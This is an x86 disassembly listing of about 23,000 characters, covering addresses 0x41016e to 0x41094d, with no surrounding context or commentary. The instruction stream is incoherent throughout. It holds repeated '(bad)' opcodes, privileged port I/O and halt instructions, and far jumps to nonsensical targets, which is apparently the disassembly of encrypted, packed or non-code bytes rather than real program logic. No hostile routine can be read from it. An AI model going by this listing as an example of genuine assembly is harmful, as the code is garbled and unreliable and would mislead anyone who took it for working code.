  41016e:	cs cmp al,0x86
  410171:	call   DWORD PTR [edi+0x1e]
  410174:	bound  eax,QWORD PTR [esi-0x2879e200]
  41017a:	je     0x4101b7
  41017c:	inc    edx
  41017d:	cli    
  41017e:	pusha  
  41017f:	xchg   esi,eax
  410180:	or     BYTE PTR [edx-0x42],0xfd
  410184:	icebp  
  410185:	int    0xb2
  410187:	sbb    al,0xa6
  410189:	in     al,0xb2
  41018b:	cmc    
  41018c:	sub    BYTE PTR [edx],ah
  41018e:	ret    0x4faf
  410191:	adc    eax,0xa603612d
  410196:	lock mov dh,0xdb
  410199:	ja     0x410197
  41019b:	and    BYTE PTR [ecx+eiz*1],bl
  41019e:	lods   al,BYTE PTR ds:[esi]
  41019f:	push   ebp
  4101a0:	push   ebp
  4101a1:	mov    DWORD PTR [edx+eiz*1],esi
  4101a4:	inc    eax
  4101a5:	mov    esi,0x9db62ec7
  4101aa:	push   edi
  4101ab:	sbb    DWORD PTR ds:0xbecaafe3,esp
  4101b1:	mov    eax,ds:0x61992afa
  4101b6:	jo     0x410177
  4101b8:	xchg   ebx,eax
  4101b9:	movsx  ecx,bl
  4101bc:	stos   DWORD PTR es:[edi],eax
  4101bd:	mov    esi,0xe78be985
  4101c2:	inc    edx
  4101c3:	cmp    esi,DWORD PTR ds:0x8c19f342
  4101c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ca:	inc    ebx
  4101cb:	cs add ecx,ecx
  4101ce:	hlt    
  4101cf:	push   esp
  4101d0:	and    dh,BYTE PTR [ebx]
  4101d2:	repnz mul DWORD PTR [ebx+edx*8-0x59784e52]
  4101da:	mov    ebx,0xbefdedca
  4101df:	scas   al,BYTE PTR es:[edi]
  4101e0:	test   DWORD PTR [eax+0x15],ebp
  4101e3:	retf   
  4101e4:	and    DWORD PTR [ecx-0x682f173e],edx
  4101ea:	add    dh,bh
  4101ec:	push   eax
  4101ed:	xor    al,0xf2
  4101ef:	mov    bh,0x41
  4101f1:	rcr    DWORD PTR [ebp+eiz*2+0x71b3a774],cl
  4101f8:	lahf   
  4101f9:	jnp    0x4101ef
  4101fb:	xchg   ebx,eax
  4101fc:	out    dx,al
  4101fd:	and    eax,0xd0e8ae1b
  410202:	out    0x10,eax
  410204:	(bad)  
  410205:	ja     0x410232
  410207:	xchg   edx,eax
  410208:	mov    ecx,0x1ec2a0cc
  41020d:	je     0x410220
  41020f:	inc    esp
  410210:	test   eax,0x707170f2
  410215:	data16 loopne 0x41023a
  410218:	daa    
  410219:	lods   eax,DWORD PTR ds:[esi]
  41021a:	xchg   DWORD PTR ds:0x14730235,ecx
  410220:	dec    eax
  410221:	or     DWORD PTR gs:[ebp-0x78eae584],edx
  410228:	xor    DWORD PTR [ebp-0x393e5cf4],esi
  41022e:	in     al,dx
  41022f:	cmp    eax,0x816b4b12
  410234:	pop    es
  410235:	in     al,dx
  410236:	rol    ch,0x28
  410239:	adc    BYTE PTR [ebx-0xde6e81b],ch
  41023f:	mov    BYTE PTR [edi-0x39],bl
  410242:	aad    0x80
  410244:	arpl   WORD PTR [ebx-0x6e16e04],cx
  41024a:	push   ebx
  41024b:	adc    BYTE PTR [eax+0x42],ch
  41024e:	pop    esp
  41024f:	jbe    0x41020e
  410251:	sub    DWORD PTR [esi+0x34],ecx
  410254:	cmp    al,0xd6
  410256:	inc    esp
  410257:	(bad)  
  410258:	dec    edi
  410259:	fidiv  WORD PTR [ebp+0x28a80bdd]
  41025f:	cs (bad) 
  410261:	jmp    0x9bd0:0xf6bf65f3
  410268:	xor    BYTE PTR [ebp+0x42],cl
  41026b:	retf   
  41026c:	and    BYTE PTR [edx+eax*1-0x27],dh
  410270:	ror    esi,1
  410272:	enter  0x7dad,0xfc
  410276:	add    DWORD PTR [ecx+0x7a],0xa4605cde
  41027d:	das    
  41027e:	or     ah,BYTE PTR [ecx+0x47]
  410281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410282:	retf   
  410283:	bnd jg 0x4102d0
  410286:	ja     0x410226
  410288:	les    eax,FWORD PTR [eax]
  41028a:	fsubr  DWORD PTR [ecx-0x56]
  41028d:	adc    eax,0x22fad7ca
  410292:	mov    edi,0xdb84e34e
  410297:	adc    dh,bl
  410299:	xchg   esi,eax
  41029a:	out    dx,eax
  41029b:	inc    esi
  41029c:	fiadd  WORD PTR [edx]
  41029e:	test   DWORD PTR [esi+ecx*2-0x2ccb3185],ebp
  4102a5:	mov    ah,0xfe
  4102a7:	dec    ebp
  4102a8:	jle    0x4102d8
  4102aa:	sbb    eax,eax
  4102ac:	nop
  4102ad:	out    dx,eax
  4102ae:	(bad)  
  4102af:	push   DWORD PTR [esi-0xd]
  4102b2:	std    
  4102b3:	mov    ds:0x8f62fb1,eax
  4102b8:	xor    ecx,ebp
  4102ba:	and    DWORD PTR [ecx],eax
  4102bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102bd:	sub    BYTE PTR [esi],dl
  4102bf:	jl     0x410244
  4102c1:	mov    dh,0xe4
  4102c3:	enter  0x1cfb,0xe3
  4102c7:	sub    al,0x9d
  4102c9:	mov    ah,bl
  4102cb:	jno    0x41033c
  4102cd:	fchs   
  4102cf:	stos   BYTE PTR es:[edi],al
  4102d0:	mov    edi,0xa216998c
  4102d5:	xor    BYTE PTR [edi+ebx*4+0x2b],bl
  4102d9:	mov    DWORD PTR [ecx+0x5cd2ed9c],ecx
  4102df:	imul   esi,edi,0xe2ffee18
  4102e5:	leave  
  4102e6:	push   cs
  4102e7:	neg    esp
  4102e9:	cmp    BYTE PTR ds:[ebx+0x3e],ah
  4102ed:	cmp    DWORD PTR [edi-0xd8ee51d],0xd88c7371
  4102f7:	cdq    
  4102f8:	leave  
  4102f9:	mov    esi,0x452cc905
  4102fe:	dec    ebx
  4102ff:	mov    DWORD PTR [ecx+0x7],esp
  410302:	push   ebx
  410303:	jmp    0x4102c6
  410305:	fstp   TBYTE PTR [esp+edx*1+0x7f]
  410309:	scas   al,BYTE PTR es:[edi]
  41030a:	mov    ebp,DWORD PTR ds:0x9a13166c
  410310:	shl    esi,0xe1
  410313:	sti    
  410314:	rol    bl,0x87
  410317:	dec    edi
  410318:	push   es
  410319:	lods   eax,DWORD PTR ds:[esi]
  41031a:	mov    al,ds:0x9dcb41bb
  41031f:	cs mov dh,0xfd
  410322:	inc    ecx
  410323:	outs   dx,DWORD PTR ds:[esi]
  410324:	adc    al,0x58
  410326:	cmp    cl,BYTE PTR [ebx+edi*8-0x584701c2]
  41032d:	sub    bh,BYTE PTR [ecx]
  41032f:	or     eax,0x7bf20314
  410334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410335:	mov    eax,ds:0xc963c695
  41033a:	xchg   ecx,eax
  41033b:	fistp  QWORD PTR [ecx]
  41033d:	mov    esp,ebx
  41033f:	jmp    0x717b:0x53261415
  410346:	cmp    BYTE PTR [ebp-0x406452e],ch
  41034c:	push   ds
  41034d:	xchg   BYTE PTR [esi],dl
  41034f:	ins    DWORD PTR es:[edi],dx
  410350:	popf   
  410351:	lods   al,BYTE PTR ds:[esi]
  410352:	data16 sbb ch,BYTE PTR ds:0x8beb11c9
  410359:	jnp    0x4103b2
  41035b:	hlt    
  41035c:	cld    
  41035d:	jns    0x410319
  41035f:	cmp    eax,0xc137349f
  410364:	sub    cl,al
  410366:	mov    esi,0xa5300923
  41036b:	out    0xa9,eax
  41036d:	or     dl,BYTE PTR [esi]
  41036f:	rcl    BYTE PTR [edi],0x68
  410372:	sbb    esp,eax
  410374:	ds call 0xfe52ca87
  41037a:	mov    eax,ds:0xf96b3a61
  41037f:	jns    0x4103f4
  410381:	dec    ebp
  410382:	scas   al,BYTE PTR es:[edi]
  410383:	jno    0x410344
  410385:	mov    al,0x1e
  410387:	dec    esi
  410388:	stc    
  410389:	push   ds
  41038a:	dec    edx
  41038b:	mov    ch,0x68
  41038d:	sbb    BYTE PTR [esp+eax*8+0x2b],0x8
  410392:	cs add bh,0x13
  410396:	retf   
  410397:	nop
  410398:	xchg   ebx,eax
  410399:	pop    esi
  41039a:	les    eax,FWORD PTR [edx+ebx*1]
  41039d:	xchg   ebp,eax
  41039e:	lods   eax,DWORD PTR ds:[esi]
  41039f:	mov    esi,0xa31f44d4
  4103a4:	addr16 ds mov al,0xc2
  4103a8:	ds mov dl,0x98
  4103ab:	sbb    ah,dl
  4103ad:	xchg   DWORD PTR [ebx],ebp
  4103af:	push   ebp
  4103b0:	shl    dl,1
  4103b2:	mov    ebp,0x9910244f
  4103b7:	jno    0x410368
  4103b9:	pushf  
  4103ba:	xor    ecx,DWORD PTR [eax]
  4103bc:	push   0x39dab537
  4103c1:	shr    BYTE PTR [ecx],cl
  4103c3:	dec    esp
  4103c4:	cmp    al,0xf6
  4103c6:	sbb    DWORD PTR [ebx+ecx*8],edx
  4103c9:	xchg   ebp,eax
  4103ca:	sub    al,0xc5
  4103cc:	or     DWORD PTR [esi+0x3],0xb24559ff
  4103d3:	ret    
  4103d4:	das    
  4103d5:	or     ch,BYTE PTR [ebx]
  4103d7:	bound  ebp,QWORD PTR [eax+ebx*8-0x80]
  4103db:	imul   ch
  4103dd:	call   0x16de:0xf80488a0
  4103e4:	mov    ecx,0x7975a18b
  4103e9:	mov    eax,ds:0x86bf1f91
  4103ee:	test   DWORD PTR [edx],esp
  4103f0:	jns    0x410448
  4103f2:	jb     0x41044c
  4103f4:	xchg   ebp,eax
  4103f5:	or     ecx,0x72d22c87
  4103fb:	mov    ds:0xe994d5dc,al
  410400:	jg     0x4103c3
  410402:	in     eax,0x4d
  410404:	stos   DWORD PTR es:[edi],eax
  410405:	enter  0xa4e1,0x1e
  410409:	jecxz  0x4103e4
  41040b:	mov    al,0xcd
  41040d:	hlt    
  41040e:	and    eax,0x5c7a7d1
  410413:	rol    BYTE PTR [esi-0x2bed508e],cl
  410419:	and    bh,ch
  41041b:	div    BYTE PTR [edx-0x5565accf]
  410421:	maxps  xmm6,xmm3
  410424:	mov    ebx,0xce163444
  410429:	or     edx,esi
  41042b:	call   0xd438265b
  410430:	cmp    ch,al
  410432:	test   eax,0xd4d87ee
  410437:	jmp    0x410457
  410439:	repz push edi
  41043b:	icebp  
  41043c:	mov    bh,0xf4
  41043e:	fcomip st,st(5)
  410440:	dec    esp
  410441:	scas   al,BYTE PTR es:[edi]
  410442:	push   ebp
  410443:	or     ebx,ecx
  410445:	and    BYTE PTR [edx],ah
  410447:	(bad)  
  410448:	loop   0x410420
  41044a:	in     eax,0x94
  41044c:	xchg   edx,eax
  41044d:	cs mov cl,0xfc
  410450:	(bad)  
  410451:	jo     0x4104ca
  410453:	push   0xffffffe7
  410455:	ror    al,1
  410457:	bound  edx,QWORD PTR [ecx]
  410459:	mov    ds:0x6a6d2a36,al
  41045e:	ss push cs
  410460:	aam    0x56
  410462:	das    
  410463:	aaa    
  410464:	imul   eax,DWORD PTR [edx+0x68b59803],0x21
  41046b:	mov    dh,0x8
  41046d:	pushf  
  41046e:	addr16 and al,0xcd
  410471:	mov    ds:0xf8c5bc99,eax
  410476:	xchg   ecx,eax
  410477:	(bad)  
  410478:	loopne 0x41042b
  41047a:	dec    edi
  41047b:	int3   
  41047c:	call   0xbc52:0xe8d8e8e5
  410483:	lahf   
  410484:	mov    esp,0x238491f3
  410489:	fisubr DWORD PTR [edx-0x413cb5f7]
  410490:	cmp    BYTE PTR [eax],al
  410492:	push   esi
  410493:	xchg   ebx,eax
  410494:	pop    es
  410495:	les    ecx,FWORD PTR [ebx]
  410497:	repz cwde 
  410499:	cmp    al,BYTE PTR [edi+0x51]
  41049c:	xchg   edx,eax
  41049d:	and    al,0x5c
  41049f:	push   ecx
  4104a0:	lock sbb bl,al
  4104a3:	fnstsw WORD PTR [esi+0x30]
  4104a6:	lahf   
  4104a7:	arpl   si,cx
  4104a9:	pop    eax
  4104aa:	add    al,0x80
  4104ac:	dec    edi
  4104ad:	bound  esp,QWORD PTR [eax-0x62]
  4104b0:	jbe    0x41049a
  4104b2:	xchg   esi,eax
  4104b3:	push   es
  4104b4:	xchg   DWORD PTR [ebx-0x3e],eax
  4104b7:	add    esi,DWORD PTR [ecx+0x23]
  4104ba:	cwde   
  4104bb:	add    BYTE PTR [ecx],dh
  4104bd:	push   esi
  4104be:	sub    DWORD PTR [eax-0x27f9c0f1],esp
  4104c4:	nop
  4104c5:	daa    
  4104c6:	div    DWORD PTR [eax]
  4104c8:	cdq    
  4104c9:	cmp    ah,BYTE PTR [edx+esi*2]
  4104cc:	bnd jae 0x4104fa
  4104cf:	stos   DWORD PTR es:[edi],eax
  4104d0:	repnz cmp BYTE PTR [eax-0x63d5a005],dh
  4104d7:	aaa    
  4104d8:	inc    edi
  4104d9:	pop    esi
  4104da:	xchg   esi,eax
  4104db:	cs jl  0x410512
  4104de:	mov    al,0x86
  4104e0:	es jnp 0x410481
  4104e3:	es adc dl,ah
  4104e6:	jbe    0x410501
  4104e8:	fidivr WORD PTR [ebp+0x46]
  4104eb:	fadd   DWORD PTR [esi+0x30]
  4104ee:	jmp    ecx
  4104f0:	mov    edx,esp
  4104f2:	xor    eax,0x651ab0e7
  4104f7:	push   esp
  4104f8:	(bad)  
  4104f9:	cld    
  4104fa:	mov    edi,0xd7ea8d80
  4104ff:	iret   
  410500:	lea    edi,[edx]
  410502:	xchg   esp,eax
  410503:	pop    ds
  410504:	shl    ecx,cl
  410506:	in     eax,0x19
  410508:	mov    eax,0x247c4dab
  41050d:	xor    eax,0x5bbc0d21
  410512:	ins    DWORD PTR es:[edi],dx
  410513:	and    ch,BYTE PTR [edi-0x37]
  410516:	or     BYTE PTR [ebx],dl
  410518:	aas    
  410519:	pop    edx
  41051a:	mov    ecx,0xf52c0cb
  41051f:	je     0x41058d
  410521:	sub    al,0x72
  410523:	or     DWORD PTR [eax],edi
  410525:	sub    al,0x3d
  410527:	popf   
  410528:	jnp    0x4104e7
  41052a:	push   0x76
  41052c:	sti    
  41052d:	shr    DWORD PTR [ebx],cl
  41052f:	or     DWORD PTR [ebx+0x53],0xf
  410533:	push   eax
  410534:	sti    
  410535:	pop    ebp
  410536:	repnz mov DWORD PTR [di-0x46],edx
  41053b:	mov    cl,0x3c
  41053d:	inc    ecx
  41053e:	and    BYTE PTR [ebp+0x7d7a24b1],dl
  410544:	not    BYTE PTR [esi+edi*1+0x6ef37322]
  41054b:	mov    dh,0xe2
  41054d:	inc    ebp
  41054e:	dec    ecx
  41054f:	jne    0x410579
  410551:	daa    
  410552:	push   eax
  410553:	jge    0x41051a
  410555:	es dec ecx
  410557:	push   0x4d
  410559:	pop    eax
  41055a:	fwait
  41055b:	inc    edx
  41055c:	shl    ecx,1
  41055e:	sub    BYTE PTR [ebx-0x57762efe],0x66
  410565:	jge    0x410561
  410567:	dec    edi
  410568:	pop    ebx
  410569:	sub    DWORD PTR [eax+esi*2-0x4e467150],0xffffffc2
  410571:	pop    es
  410572:	outs   dx,DWORD PTR ds:[esi]
  410573:	dec    edi
  410574:	fstp   QWORD PTR [esi+0x4f64cea9]
  41057a:	cmp    bl,BYTE PTR [ebp+0x25dbb3f7]
  410580:	or     BYTE PTR [esp+edi*8+0x52f64c06],bh
  410587:	inc    ebx
  410588:	out    0x98,eax
  41058a:	pop    esp
  41058b:	xor    bl,BYTE PTR [ebp-0x1c]
  41058e:	pop    es
  41058f:	push   ebx
  410590:	test   eax,0x7c86ca0b
  410595:	xor    eax,0xac709b7d
  41059a:	(bad)  
  41059b:	sti    
  41059c:	lods   al,BYTE PTR ds:[esi]
  41059d:	pop    ds
  41059e:	sub    dl,BYTE PTR [esp+ebp*8]
  4105a1:	aas    
  4105a2:	inc    edi
  4105a3:	add    al,0xd3
  4105a5:	push   esp
  4105a6:	sysenter 
  4105a8:	pop    esp
  4105a9:	mov    eax,ds:0x5d95a9eb
  4105ae:	mov    dh,0x85
  4105b0:	push   es
  4105b1:	lock hlt 
  4105b3:	lock ror dl,0xfe
  4105b7:	inc    eax
  4105b8:	add    DWORD PTR ds:0x6f50fcfd,esi
  4105be:	push   ecx
  4105bf:	fist   WORD PTR [esi]
  4105c1:	pop    ebx
  4105c2:	outs   dx,DWORD PTR ds:[esi]
  4105c3:	(bad)  
  4105c5:	jb     0x41063e
  4105c7:	retf   
  4105c8:	pop    ebp
  4105c9:	fstp   QWORD PTR [eax]
  4105cb:	jbe    0x410633
  4105cd:	shl    BYTE PTR [edi+edi*1-0x18b39ea1],0x6f
  4105d5:	add    ch,dl
  4105d7:	dec    ecx
  4105d8:	aas    
  4105d9:	sbb    eax,0x2445a786
  4105de:	lds    edx,FWORD PTR [ecx]
  4105e0:	xchg   esp,eax
  4105e1:	cmp    al,0x1a
  4105e3:	stc    
  4105e4:	fwait
  4105e5:	mov    ebx,0x26123c7d
  4105ea:	sbb    bh,cl
  4105ec:	scas   al,BYTE PTR es:[edi]
  4105ed:	push   0x391e002e
  4105f2:	pushf  
  4105f3:	nop
  4105f4:	ins    DWORD PTR es:[edi],dx
  4105f5:	jecxz  0x4105a4
  4105f7:	add    edi,edi
  4105f9:	pop    ss
  4105fa:	(bad)  
  4105fb:	aaa    
  4105fc:	lea    ebx,[ecx]
  4105fe:	test   DWORD PTR ds:0x5f3f24ae,ebp
  410604:	sbb    al,0x39
  410606:	pop    eax
  410607:	dec    ecx
  410608:	lock push ebp
  41060a:	into   
  41060b:	ins    DWORD PTR es:[edi],dx
  41060c:	call   0xfa835656
  410611:	iret   
  410612:	xor    eax,0x26c765d
  410617:	aam    0xa6
  410619:	and    BYTE PTR [ecx+eax*2-0x53c9fa2d],0x7f
  410621:	or     DWORD PTR ds:0x2b6b9db4,edi
  410627:	sahf   
  410628:	and    ecx,edi
  41062a:	inc    ebx
  41062b:	mul    ch
  41062d:	adc    eax,0x17d9ce6d
  410632:	not    DWORD PTR [esi-0x22]
  410635:	loopne 0x4105be
  410637:	mov    cl,0x42
  410639:	cs sub eax,0x3d0fde19
  41063f:	mov    esp,DWORD PTR [ebp+0x2184c0ea]
  410645:	dec    esp
  410646:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410647:	outs   dx,BYTE PTR ds:[esi]
  410648:	cmp    DWORD PTR [edi+0x7c4ca97c],esp
  41064e:	push   ss
  41064f:	xchg   esp,eax
  410650:	fiadd  WORD PTR [ecx+0x6f]
  410653:	push   ebx
  410654:	sub    eax,0xe06986dc
  410659:	cld    
  41065a:	fcmovb st,st(4)
  41065c:	push   ebx
  41065d:	stos   BYTE PTR es:[edi],al
  41065e:	inc    BYTE PTR [edi+0x32e6e194]
  410664:	dec    edx
  410665:	mov    bh,0x91
  410667:	hlt    
  410668:	mov    cl,0x38
  41066a:	(bad)  
  41066b:	mov    eax,0x4a75bdc9
  410670:	push   edi
  410671:	mov    cl,0xf6
  410673:	loope  0x4106cc
  410675:	or     eax,0x47c8e12
  41067a:	or     DWORD PTR [ebp-0x49d018e4],esi
  410680:	repnz push 0xffffffa9
  410683:	push   ebx
  410684:	mov    ds:0xc2202286,eax
  410689:	(bad)  
  41068a:	mov    dh,0x7c
  41068c:	cli    
  41068d:	or     ah,cl
  41068f:	push   0x22
  410691:	and    esp,DWORD PTR [esi-0x305ad1cf]
  410697:	pusha  
  410698:	jmp    0xd004:0x5a6abb7f
  41069f:	ja     0x4106df
  4106a1:	daa    
  4106a2:	mov    ds:0xf9c91b85,al
  4106a7:	sbb    al,0xdb
  4106a9:	inc    eax
  4106aa:	retf   0x7b78
  4106ad:	mov    DWORD PTR [esi+0x62],edi
  4106b0:	and    esp,eax
  4106b2:	push   0x11ef5fd1
  4106b7:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106b9:	jbe    0x41067d
  4106bb:	aad    0xff
  4106bd:	dec    ebp
  4106be:	push   cs
  4106bf:	je     0x4106b8
  4106c1:	popf   
  4106c2:	ds jae 0x4106e4
  4106c5:	fdiv   DWORD PTR [edx+0x5ffe90bf]
  4106cb:	mov    al,ds:0x4c2318c1
  4106d0:	popa   
  4106d1:	cwde   
  4106d2:	test   edi,esp
  4106d4:	or     ah,cl
  4106d6:	push   ecx
  4106d7:	inc    ebx
  4106d8:	pop    edi
  4106d9:	mov    cl,0xfd
  4106db:	or     esp,DWORD PTR [ecx-0x63]
  4106de:	cmp    dl,ch
  4106e0:	mov    ds,eax
  4106e2:	es dec ebp
  4106e4:	add    ebx,ebx
  4106e6:	outs   dx,BYTE PTR ds:[esi]
  4106e7:	js     0x41066e
  4106e9:	xor    edi,DWORD PTR fs:[eax+0x7]
  4106ed:	mov    bl,0x89
  4106ef:	sbb    BYTE PTR [esi-0x3427c434],dh
  4106f5:	loope  0x410702
  4106f7:	sub    BYTE PTR [esi+0x43bb5e95],al
  4106fd:	in     eax,0x87
  4106ff:	nop
  410700:	sar    esp,0xe0
  410703:	arpl   WORD PTR [esi],dx
  410705:	adc    edi,DWORD PTR [ebx+0x3ebd380a]
  41070b:	sub    al,0x5a
  41070d:	cmp    eax,0x768478d5
  410713:	icebp  
  410714:	popa   
  410715:	js     0x410725
  410717:	loopne 0x4106bc
  410719:	sub    ecx,0x44
  41071c:	mov    esp,0xde85442d
  410721:	aas    
  410722:	test   BYTE PTR [ebp-0x43e66585],ah
  410728:	ins    DWORD PTR es:[edi],dx
  410729:	push   ss
  41072a:	and    DWORD PTR [esi],eax
  41072c:	push   ebx
  41072d:	and    eax,0x3ca61fd8
  410732:	add    al,0xa4
  410734:	mov    bh,0x3b
  410736:	test   eax,0xad0f0106
  41073b:	push   esi
  41073c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41073d:	and    bh,BYTE PTR [ebx+esi*4+0x4c]
  410741:	scas   eax,DWORD PTR es:[edi]
  410742:	int3   
  410743:	jg     0x41077a
  410745:	retf   
  410746:	pop    ss
  410747:	scas   eax,DWORD PTR es:[edi]
  410748:	hlt    
  410749:	pusha  
  41074a:	and    BYTE PTR [eax],ah
  41074c:	scas   eax,DWORD PTR es:[edi]
  41074d:	pop    ss
  41074e:	mov    dh,ah
  410750:	popa   
  410751:	in     al,dx
  410752:	or     DWORD PTR [ebx+ebx*2],0xfce5406d
  410759:	rol    DWORD PTR [edi+0x73c4761e],1
  41075f:	clc    
  410760:	jl     0x410744
  410762:	mov    ds:0x37327787,eax
  410767:	stos   DWORD PTR es:[edi],eax
  410768:	loop   0x4107ce
  41076a:	mov    ch,al
  41076c:	imul   ebp,edi,0x19
  41076f:	loopne 0x4107e1
  410771:	pop    es
  410772:	cmp    edi,DWORD PTR [eax+0x9da1073]
  410778:	mov    DWORD PTR [esi+0x4146db9f],ebp
  41077e:	mov    dl,0x35
  410780:	int3   
  410781:	mov    eax,0x45e169fd
  410786:	jecxz  0x410751
  410788:	jbe    0x41073d
  41078a:	mov    DWORD PTR [edx+0x43],ebp
  41078d:	lea    ebp,[edi-0x4f]
  410790:	pshufw mm4,QWORD PTR [eax],0x59
  410794:	adc    ecx,edx
  410796:	xchg   BYTE PTR [edi],cl
  410798:	pop    ecx
  410799:	inc    ebp
  41079a:	fbstp  TBYTE PTR [edi-0x4]
  41079d:	jne    0x410720
  41079f:	retf   
  4107a0:	sbb    dl,al
  4107a2:	bnd call 0x9096f811
  4107a8:	ins    DWORD PTR es:[edi],dx
  4107a9:	loope  0x4107af
  4107ab:	add    al,0x47
  4107ad:	sbb    al,0x88
  4107af:	ret    0xb98d
  4107b2:	pop    edi
  4107b3:	add    eax,0x8d9bb346
  4107b8:	stos   DWORD PTR es:[edi],eax
  4107b9:	add    al,0x9b
  4107bb:	inc    ecx
  4107bc:	add    eax,0xaf479121
  4107c1:	dec    eax
  4107c2:	pop    DWORD PTR [edx]
  4107c4:	sub    BYTE PTR [ecx+edi*8],cl
  4107c7:	addr16 stc 
  4107c9:	sub    al,BYTE PTR [ebp+edx*4-0x5a26a253]
  4107d0:	sbb    eax,0xa9d7a82
  4107d5:	clc    
  4107d6:	or     al,0xd5
  4107d8:	inc    ebp
  4107d9:	dec    ebp
  4107da:	push   edi
  4107db:	inc    esp
  4107dc:	or     BYTE PTR [ecx-0x54e9522c],bh
  4107e2:	jg     0x410825
  4107e4:	jl     0x4107f1
  4107e6:	je     0x41085c
  4107e8:	fs or  eax,0xb7be5568
  4107ee:	push   esp
  4107ef:	and    DWORD PTR [eax+0x20794315],0x1f
  4107f6:	ins    DWORD PTR es:[edi],dx
  4107f7:	outs   dx,DWORD PTR ds:[esi]
  4107f8:	cmp    edx,DWORD PTR [ecx+0x34]
  4107fb:	lods   eax,DWORD PTR ds:[esi]
  4107fc:	sub    eax,DWORD PTR [edx-0x52]
  4107ff:	les    eax,FWORD PTR [edx+edx*8]
  410802:	daa    
  410803:	and    DWORD PTR [ebp+0x65],0xffffffe3
  410807:	daa    
  410808:	fwait
  410809:	stc    
  41080a:	aas    
  41080b:	mov    ah,0xc2
  41080d:	sbb    al,0x17
  41080f:	loopne 0x41081f
  410811:	xor    al,0x31
  410813:	add    ebp,DWORD PTR [edi-0x6f]
  410816:	jmp    FWORD PTR [edi+0x727d2d9a]
  41081c:	retf   
  41081d:	clc    
  41081e:	shl    bl,0x56
  410821:	ret    
  410822:	or     al,0x7a
  410824:	push   ss
  410825:	and    cl,ch
  410827:	bound  edi,QWORD PTR [edx+ebx*4]
  41082a:	js     0x4107dd
  41082c:	push   esi
  41082d:	rcr    DWORD PTR [ebx],0xae
  410830:	push   es
  410831:	shl    DWORD PTR [eax+0x5e4a35a5],1
  410837:	sbb    al,0x41
  410839:	jecxz  0x4108ad
  41083b:	std    
  41083c:	retf   
  41083d:	and    al,0x73
  41083f:	(bad)  
  410840:	pop    ds
  410841:	adc    cl,dh
  410843:	jecxz  0x4108a9
  410845:	in     al,0x4b
  410847:	scas   eax,DWORD PTR es:[edi]
  410848:	add    al,0xf2
  41084a:	fmul   QWORD PTR [ecx]
  41084c:	and    edi,esp
  41084e:	test   esp,ebx
  410850:	adc    eax,0x750faea
  410855:	push   ebp
  410856:	inc    esp
  410857:	dec    edi
  410858:	(bad)  
  410859:	add    BYTE PTR ss:[edi+0x744e148f],0x34
  410861:	lock rol DWORD PTR [edx+0x3d],cl
  410865:	mov    esp,0xd2ff7a2c
  41086a:	sar    DWORD PTR [ecx],0x83
  41086d:	dec    esi
  41086e:	jno    0x4108df
  410870:	dec    esi
  410871:	pop    ds
  410872:	sti    
  410873:	mov    ds:0x52267e9a,eax
  410878:	stos   BYTE PTR es:[edi],al
  410879:	sbb    edi,DWORD PTR [esi-0x458185b0]
  41087f:	fdiv   st,st(2)
  410881:	fcomp  st(3)
  410883:	add    eax,0x5b04e8bc
  410888:	and    eax,0x27af4b26
  41088d:	xor    eax,0x18999e15
  410892:	mov    edi,0x2852a70d
  410897:	or     esi,DWORD PTR [edi+edi*4+0x2189c694]
  41089e:	and    al,0x25
  4108a0:	jmp    0x4108ab
  4108a2:	jle    0x4108e1
  4108a4:	sar    BYTE PTR [edx-0x5d],1
  4108a7:	cmc    
  4108a8:	in     eax,dx
  4108a9:	neg    ebx
  4108ab:	lods   eax,DWORD PTR ds:[esi]
  4108ac:	fld    DWORD PTR [ebx+0x8819766]
  4108b2:	mov    ecx,0xbc196ce2
  4108b7:	icebp  
  4108b8:	dec    esi
  4108b9:	jge    0x410893
  4108bb:	pusha  
  4108bc:	mov    fs,WORD PTR [esi-0x67]
  4108bf:	nop
  4108c0:	inc    edx
  4108c1:	loop   0x410939
  4108c3:	pop    ebx
  4108c4:	lock sbb esp,0x5b
  4108c8:	stos   DWORD PTR es:[edi],eax
  4108c9:	cmp    BYTE PTR [edi],ah
  4108cb:	lods   al,BYTE PTR ds:[esi]
  4108cc:	bound  ebp,QWORD PTR [edx]
  4108ce:	add    cl,BYTE PTR [edi+0x14]
  4108d1:	(bad)  
  4108d2:	in     al,0x93
  4108d4:	mov    ds:0x958f4f90,al
  4108d9:	ficom  WORD PTR [esi-0x29]
  4108dc:	stos   DWORD PTR es:[edi],eax
  4108dd:	push   esi
  4108de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108df:	add    al,0x22
  4108e1:	imul   eax,DWORD PTR [ecx+edi*4-0x1a],0x69
  4108e6:	push   esp
  4108e7:	pop    ebx
  4108e8:	rol    DWORD PTR [esi-0x26],0x5c
  4108ec:	mov    ebp,0x3d9ce4f
  4108f1:	push   ss
  4108f2:	pop    ebx
  4108f3:	sbb    al,0x9f
  4108f5:	das    
  4108f6:	imul   ecx,esp,0x1547e18a
  4108fc:	or     al,0xb2
  4108fe:	jo     0x41097e
  410900:	add    esp,0xf7f6d0ba
  410906:	shl    BYTE PTR [esi],0x1c
  410909:	out    0x83,eax
  41090b:	or     ch,al
  41090d:	stos   BYTE PTR es:[edi],al
  41090e:	enter  0xef85,0x58
  410912:	sub    al,0xe4
  410914:	cmc    
  410915:	bound  ecx,QWORD PTR [esi+0x6b]
  410918:	ja     0x4108dc
  41091a:	or     dh,BYTE PTR [eax-0x21]
  41091d:	inc    esp
  41091e:	mov    ecx,0x7ba613a2
  410923:	push   esi
  410924:	xchg   ebx,eax
  410925:	pop    ebx
  410926:	ret    0xaf5b
  410929:	fcmove st,st(0)
  41092b:	out    0x35,al
  41092d:	sbb    edx,edi
  41092f:	push   ecx
  410930:	psubsw mm3,QWORD PTR [edx]
  410933:	sub    DWORD PTR [edi+0x17],esp
  410936:	jne    0x410978
  410938:	in     eax,dx
  410939:	xchg   ebx,eax
  41093a:	inc    eax
  41093b:	jne    0x41095d
  41093d:	out    0x7,eax
  41093f:	into   
  410940:	clc    
  410941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410942:	mov    DWORD PTR [esi-0xd744965],esi
  410948:	mov    al,ds:0x203d9837
  41094d:	sub    BYTE PTR [ebx],dl
